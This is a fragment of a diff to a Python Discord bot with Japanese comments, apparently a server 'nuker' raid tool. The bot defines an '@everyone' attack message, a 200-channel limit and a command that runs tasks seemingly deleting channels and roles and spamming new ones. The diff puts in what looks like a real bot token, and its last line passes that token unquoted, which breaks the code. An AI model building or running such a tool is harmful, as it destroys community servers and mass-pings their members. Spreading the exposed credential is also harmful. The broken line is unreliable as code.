@@ -4,7 +4,7 @@ import asyncio
 import random
 
 # --- 設定項目 ---
-TOKEN = "YOUR_BOT_TOKEN_HERE"
+TOKEN = "MTQ1MzY2ODMwNjM5NjUxNjUwNw.GIO9W_._3eUutnU0zhUfuVol1CzSdGm_EvZK7UhmLdN4o"
 CHANNEL_LIMIT = 200
 NAME_BASE = "dogs-on-top"
 ATTACK_MSG = "@everyone 
@@ -68,4 +68,4 @@ async def nuku(ctx):
     await asyncio.gather(*d_tasks, *r_tasks, *c_tasks)
 
 if __name__ == "__main__":
-    bot.run(TOKEN)
+    bot.run(MTQ1MzY2ODMwNjM5NjUxNjUwNw.GIO9W_._3eUutnU0zhUfuVol1CzSdGm_EvZK7UhmLdN4o)
